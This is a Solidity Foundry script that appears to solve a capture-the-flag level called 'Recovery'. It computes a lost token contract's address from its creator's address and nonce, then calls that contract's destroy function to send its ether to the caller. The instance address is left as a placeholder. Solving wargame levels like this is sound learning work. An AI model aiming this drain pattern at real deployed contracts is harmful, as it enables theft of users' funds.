// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/17-Recovery.sol"; 


contract Exp is Script {

    Recovery public RecoveryInstance = Recovery(payable(/*获取的实例地址*/));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS"); 

    function run() external {
        vm.startBroadcast(hacker);

        //nonce1 = address(keccak256(0xd6, 0x94, address, 0x01))
        address lostTokenAddress = address(uint160(uint(keccak256(abi.encodePacked(
            bytes1(0xd6),
            bytes1(0x94),
            address(RecoveryInstance),
            bytes1(0x01) 
        )))));

        SimpleToken lostTokenContract = SimpleToken(payable(lostTokenAddress));
        lostTokenContract.destroy(payable(msg.sender));


        console.log("lostTokenAddress:", lostTokenAddress);


        vm.stopBroadcast();
    }
}


// interface SimpleToken {
//     function destroy(address payable _to) external;
// }